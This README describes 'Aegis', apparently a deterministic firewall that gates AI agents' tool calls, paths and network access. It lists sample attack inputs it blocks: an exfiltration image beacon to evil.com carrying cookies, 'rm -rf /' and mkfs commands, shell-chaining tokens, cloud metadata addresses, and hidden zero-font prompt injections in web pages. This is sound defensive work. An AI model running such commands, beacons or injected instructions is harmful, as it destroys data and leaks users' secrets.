# 🛡️ Aegis: Sovereign Negative Security Gate & Agentic Firewall

[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-19%20passed%20(4ms)-brightgreen.svg)]()
[![Tokens](https://img.shields.io/badge/token%20spend-%E2%82%AC0%20(zero)-brightgreen.svg)]()
[![Model](https://img.shields.io/badge/architecture-monotonic%20negative%20gate-blueviolet.svg)]()

> **The Supreme Constitutional Law:**  
> *"Aegis may subtract authority. Aegis may never create it."*

---

## ⚡ The Fundamental Flaw in Current AI Guardrails

Almost all modern "AI guardrails" (NeMo, Llama Guard, Guardrails AI) rely on **an LLM to judge another LLM**. This is dangerous and costly:
* **Vulnerable to Prompt Injection:** If an attacker can trick the primary model, they can trick the judge model.
* **Prohibitive Cost & Latency:** Adds 500ms–2000ms and spends paid tokens on every single user turn and tool call.
* **Positive Failure Modes:** When the judge LLM hallucinates or times out, systems often fail open.

### The Aegis Invariant: Mathematical Negative Gating

Aegis takes the opposite approach. It is a **deterministic, sub-millisecond, zero-token software firewall** operating at the tool, syscall, and network boundaries:
1. **Immune to Prompt Injection:** An LLM cannot "convince" Aegis to grant permissions. Aegis does not reason with the model; it mathematically enforces boundaries.
2. **Strict Monotonicity:** Decisions follow a strict partially ordered scale (`PASS < OBSERVE < WARN < RESTRICT < DENY < LOCK`). Once an agent session violates a rule, its privileges escalate upwards and cannot be de-escalated by the agent.
3. **Sub-Millisecond Speed & Zero Token Spend:** Evaluates ASTs, canonicalized paths, and IP boundaries in under `0.005s` with zero external API calls.

---

## 🏛️ The Four Defensive Clans

```
[ Autonomous Agent / LLM ]
           │
           ▼
┌─────────────────────────────────────────────────────────────┐
│                 AEGIS SOVEREIGN NEGATIVE GATE               │
│                                                             │
│  🌀 Labyrinth Clan:       Path traversal / path escape      │
│  🛡️ Tartarus Boundary:    Command injection / shell traps   │
│  🗝️ Credential Custody:    API key leaks / SSRF metadata     │
│  ⚔️ Hecatoncheires:       Race conditions / infinite loops  │
│  🛑 Monotonic Scale:      PASS ➔ WARN ➔ RESTRICT ➔ LOCK     │
└──────────────────────────────┬──────────────────────────────┘
                               │
                ▲ BLOCKED      │ APPROVED (Zero Authority Added)
                │              ▼
          [ Quarantine ]  [ OS / Tool Execution ]
```

1. **🌀 Labyrinth Clan:** Absolute path containment, null-byte truncation defense, recursive multi-level URL unquoting (`%252e%252e`), and symlink escape prevention.
2. **🛡️ Tartarus Clan:** Shell chaining detection (`;`, `&&`, `||`, backticks, `$()`), command tokenization via `shlex`, catastrophic command blocking (`rm -rf /`, `mkfs`), and SQL injection filtering.
3. **🗝️ Credential Custody Clan:** Zero-egress boundary for Cloud Instance Metadata (`169.254.169.254`, `metadata.google.internal`), RFC1918 intranet blocking, hex/dword IP normalization, and regex secret scanning (RSA keys, AWS tokens, GitHub tokens, JWTs).
4. **⚔️ Hecatoncheires Clan:** Runaway agent loop detection (trips emergency brake when an agent loops identical tool calls), rapid escalation limits, and concurrency lock guards.

---

## 🚀 Use Cases & Integration Modes

### 1. 🌐 Browser Extension ("AdBlocker for AI Agents")
Available under `browser-extension/`:
* Manifest V3 extension that intercepts invisible zero-font prompt injections (`font-size: 0px`, opacity 0, background-matching colors) embedded in untrusted web pages before web-browsing agents can ingest them.
* Blocks data-exfiltration image beacons (`<img src="https://evil.com/leak?cookie=...">`).

### 2. 🪢 Agent Harness Interceptor (SWE-bench, LangChain, AutoGen, CrewAI)
Wrap any Python tool or agent harness to enforce fail-closed execution:

```python
from aegis import AegisGate, AegisHarness

gate = AegisGate(base_dir="/safe/workspace")
harness = AegisHarness(gate)

@harness.protect_tool
def execute_bash(command: str):
    # If the agent attempts injection or destructive commands,
    # Aegis raises PermissionError before this function ever runs.
    return os.system(command)
```

### 3. 🔌 Model Context Protocol (MCP) Security Proxy
Protect Claude Desktop, Cursor, and Antigravity:

```python
from aegis import AegisMcpProxy

proxy = AegisMcpProxy(base_dir="./safe_dir")
should_forward, error_response, verdict = proxy.filter_request(incoming_rpc)
if not should_forward:
    send_to_client(error_response)
```

### 4. 🖥️ Desktop Daemon & Standalone REST API
Run Aegis in the background for local desktop tools:

```bash
aegis serve --port 9999
```

* `GET  http://127.0.0.1:9999/status` -> Live monotonic scale & telemetry
* `POST http://127.0.0.1:9999/gate`   -> Real-time tool call evaluation

### 5. 🏔️ OTHRYS Native Integration
Aegis serves as the sovereign Security Authority across the OTHRYS fleet:
* Maintained on the T590 Sentinel scheduler.
* Integrated into the central Sites dashboard and Titans command deck.
* Documented publicly under `/legal/security`.

---

## 🛠️ CLI Quickstart

```bash
# Scan a codebase for OWASP and secret violations
aegis audit ./my-project

# Test a tool call against the gate
aegis gate run_command '{"command": "rm -rf /"}'

# Launch the daemon
aegis serve --port 9999
```

---

## 🧪 Verification & Testing

Aegis is completely self-contained with **zero runtime external dependencies** (uses Python standard library primitives).

```bash
python -m unittest discover -s tests
# Ran 19 tests in 0.004s — OK
```

---

## 📜 License

Apache License 2.0. Copyright (c) 2026 Jeroen Pauwels / OTHRYS.
